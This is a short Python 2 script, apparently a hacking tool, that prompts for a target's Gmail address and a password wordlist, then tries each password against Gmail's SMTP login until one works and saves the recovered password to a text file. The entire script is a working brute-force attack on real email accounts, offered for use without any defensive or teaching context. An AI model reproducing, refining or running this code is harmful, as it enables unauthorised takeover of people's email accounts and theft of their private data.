import smtplib

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
def gmail():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    user = raw_input(''+T+'' + color.UNDERLINE + 'Targets email>' + color.END)
    passwfile = raw_input(''+T+'' + color.UNDERLINE + 'File name>' + color.END)
    passwfile = open(passwfile, "r")

    for password in passwfile:
	    try:
		    smtpserver.login(user, password)

		    print ""+G+"[+] "+W+"Password Found: %s" % password
		    print ""+G+"[*] Saved output to GmailPassword.txt"
		    break;
	    except smtplib.SMTPAuthenticationError:
		    print ""+R+"[!] "+W+"Password Incorrect: %s" % password
    FILE = open("GmailPassword.txt","w+")
    FILE.write('Password for ' + user + ' is: ' + password)
    FILE.close()
